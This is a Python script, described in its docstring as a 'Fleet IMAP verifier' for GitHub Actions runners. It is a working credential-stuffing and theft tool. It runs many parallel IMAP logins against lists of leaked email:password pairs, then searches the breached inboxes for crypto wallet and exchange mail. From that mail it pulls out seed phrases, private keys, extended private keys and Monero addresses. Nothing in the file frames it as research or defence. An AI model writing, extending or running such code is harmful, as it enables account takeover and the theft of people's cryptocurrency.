#!/usr/bin/env python3
"""Fleet IMAP verifier for GitHub Actions runners. Stdlib only.

Input : slice file, one per line:  email:password:imaphost
Output: results file, one per line: email:password:[REDACTED_SECRET][:detail]

Modes:
  verify  login test only (fast, ~2-3s/account)
  scan    login + IMAP search + fetch of crypto-relevant mail (slow)

Usage: runner_scan.py <slice> <out> [--mode verify|scan] [--workers N]
"""
import socket, ssl, sys, json, time, re, collections, email
from email.header import decode_header
from email.utils import parseaddr
import concurrent.futures as cf

TIMEOUT = 25

SEED_WORDS = None
SEARCHES = [
    ("seed", 'TEXT "seed phrase"'), ("seed2", 'TEXT "recovery phrase"'),
    ("seed3", 'TEXT "mnemonic"'), ("seed4", 'TEXT "seed words"'),
    ("seed5", 'TEXT "backup phrase"'),
    ("privkey", 'TEXT "private key"'), ("privkey2", 'TEXT "secret key"'),
    ("privkey3", 'TEXT "keystore"'),
    ("wallet", 'TEXT "wallet"'), ("metamask", 'TEXT "metamask"'),
    ("ledger", 'TEXT "ledger"'), ("trezor", 'TEXT "trezor"'),
    ("binance", 'FROM "binance"'), ("coinbase", 'FROM "coinbase"'),
    ("kraken", 'FROM "kraken"'), ("bitpanda", 'FROM "bitpanda"'),
    ("bitcoin_de", 'FROM "bitcoin.de"'), ("bsdex", 'FROM "bsdex"'),
    ("paypal", 'FROM "paypal"'), ("blockchain", 'TEXT "blockchain.com"'),
    ("bitcoin", 'TEXT "bitcoin"'), ("crypto", 'TEXT "crypto"'),
    ("usdt", 'TEXT "USDT"'), ("monero", 'TEXT "monero"'),
    ("ethereum", 'TEXT "ethereum"'),
]
RE_SEED = re.compile(r'\b(?:[a-z]{3,8}[ \t]+){11,23}[a-z]{3,8}\b')
RE_WIF = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
RE_XPRV = re.compile(r'\bxprv[1-9A-HJ-NP-Za-km-z]{100,120}\b')
RE_XMR = re.compile(r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b')


def dec(s):
    if not s:
        return ""
    try:
        return "".join(t.decode(e or "utf-8", "replace") if isinstance(t, bytes) else t
                       for t, e in decode_header(s))
    except Exception:
        return str(s)


class C:
    def __init__(self, host):
        self.raw = socket.create_connection((host, 993), timeout=TIMEOUT)
        ctx = ssl.create_default_context()
        self.s = ctx.wrap_socket(self.raw, server_hostname=host)
        self.s.settimeout(TIMEOUT)
        self.n = 0

    def cmd(self, line, to=None):
        self.n += 1
        t = f"t{self.n}"
        self.s.sendall(f"{t} {line}\r\n".encode())
        buf = b""; t0 = time.time(); lim = to or TIMEOUT
        while time.time() - t0 < lim:
            try:
                d = self.s.recv(131072)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
            if re.search(rb"\r?\n" + t.encode() + rb" (OK|NO|BAD)", buf):
                break
        return buf

    def close(self):
        try:
            self.cmd("LOGOUT", 4)
        except Exception:
            pass
        try:
            self.s.close()
        except Exception:
            try:
                self.raw.close()
            except Exception:
                pass


def one(rec, mode):
    """rec = (email, password, host)"""
    em, pw, host = rec
    try:
        c = C(host)
    except Exception as e:
        return (em, pw, host, "NOEGRESS", type(e).__name__)
    try:
        r = c.cmd(f'LOGIN "{em}" "{pw}"')
        if not re.search(rb"\bOK\b", r[:400]):
            c.close()
            tail = r[-80:].decode("utf-8", "replace").replace("\r\n", " ")
            return (em, pw, host, "BADPW", tail)
        if mode == "verify":
            c.close()
            return (em, pw, host, "OK", "")
        if b"OK" not in c.cmd('SELECT "INBOX"')[:400]:
            c.close()
            return (em, pw, host, "OK", "NOSELECT")
        uids = set()
        for name, q in SEARCHES:
            try:
                r = c.cmd(f"UID SEARCH {q}", to=25)
            except Exception:
                continue
            m = re.findall(rb"\* SEARCH ([\d ]*)", r)
            if m and m[0].strip():
                for u in m[0].split():
                    uids.add(u)
        findings = []
        if uids:
            ul = list(uids)[:40]
            for i in range(0, len(ul), 15):
                try:
                    r = c.cmd(f"UID FETCH {b','.join(ul[i:i+15]).decode()} (BODY.PEEK[])", to=40)
                except Exception:
                    continue
                for part in re.split(rb"\r?\n\* \d+ FETCH ", r):
                    mm = re.search(rb"\{(\d+)\}\r?\n", part)
                    if not mm:
                        continue
                    try:
                        msg = email.message_from_bytes(re.sub(rb"\r?\n\)\s*$", b"", part[mm.end():]))
                    except Exception:
                        continue
                    frm = parseaddr(dec(msg.get("From", "")))[1].lower()
                    subj = dec(msg.get("Subject", ""))
                    body = ""
                    if msg.is_multipart():
                        for p in msg.walk():
                            if p.get_content_type() == "text/plain":
                                try:
                                    body += p.get_payload(decode=True).decode("utf-8", "replace")
                                except Exception:
                                    pass
                        if not body:
                            for p in msg.walk():
                                if p.get_content_type() == "text/html":
                                    try:
                                        body += re.sub(r"<[^>]+>", " ",
                                            p.get_payload(decode=True).decode("utf-8", "replace"))
                                    except Exception:
                                        pass
                    else:
                        try:
                            body = msg.get_payload(decode=True).decode("utf-8", "replace")
                        except Exception:
                            body = str(msg.get_payload())[:6000]
                    blob = subj + "\n" + body[:50000]
                    if SEED_WORDS:
                        for s in set(RE_SEED.findall(blob)):
                            w = s.split()
                            if len(w) >= 12 and all(x.lower() in SEED_WORDS for x in w):
                                findings.append("SEED=" + s[:200])
                    for s in list(set(RE_WIF.findall(blob)))[:2]:
                        findings.append("WIF=" + s)
                    for s in list(set(RE_XPRV.findall(blob)))[:2]:
                        findings.append("XPRV=" + s)
                    for s in list(set(RE_XMR.findall(blob)))[:2]:
                        findings.append("XMR=" + s)
                    if any(k in frm for k in ("binance", "coinbase", "kraken", "bitpanda",
                                              "bitcoin.de", "bsdex", "paypal", "blockchain.com")):
                        findings.append(f"REAL={frm}|{subj[:60]}")
        c.close()
        return (em, pw, host, "OK", " || ".join(findings)[:900] if findings else f"nosig:{len(uids)}")
    except Exception as e:
        try:
            c.close()
        except Exception:
            pass
        return (em, pw, host, "ERR", f"{type(e).__name__}:{str(e)[:50]}")


def main():
    slice_f, out_f = sys.argv[1], sys.argv[2]
    mode = "verify"; workers = 120
    if "--mode" in sys.argv:
        mode = sys.argv[sys.argv.index("--mode") + 1]
    if "--workers" in sys.argv:
        workers = int(sys.argv[sys.argv.index("--workers") + 1])
    global SEED_WORDS
    try:
        SEED_WORDS = set(open("seedwords.txt").read().split())
    except Exception:
        SEED_WORDS = None

    recs = []
    for line in open(slice_f, encoding="utf-8", errors="replace"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        p = line.split(":")
        if len(p) >= 3:
            recs.append((p[0], p[1], p[2]))
        elif len(p) == 2:
            recs.append((p[0], p[1], "secureimap.t-online.de"))
    print(f"[i] {len(recs)} accounts, mode={mode}, workers={workers}", flush=True)

    counts = collections.Counter()
    t0 = time.time()
    with open(out_f, "w", buffering=1) as fh, cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for i, res in enumerate(ex.map(lambda r: one(r, mode), recs)):
            counts[res[3]] += 1
            fh.write(":".join(str(x) for x in res) + "\n")
            if (i + 1) % 500 == 0:
                el = time.time() - t0
                print(f"  [{i+1}/{len(recs)}] OK={counts['OK']} BADPW={counts['BADPW']} "
                      f"ERR={counts['ERR']} NOEGRESS={counts['NOEGRESS']} | {el:.0f}s "
                      f"({(i+1)/el:.1f}/s)", flush=True)
    el = time.time() - t0
    print(f"\n=== DONE {len(recs)} in {el:.0f}s ({(len(recs)/el if el else 0):.1f}/s) ===")
    for k, v in counts.most_common():
        print(f"   {k:<10} {v}")


if __name__ == "__main__":
    main()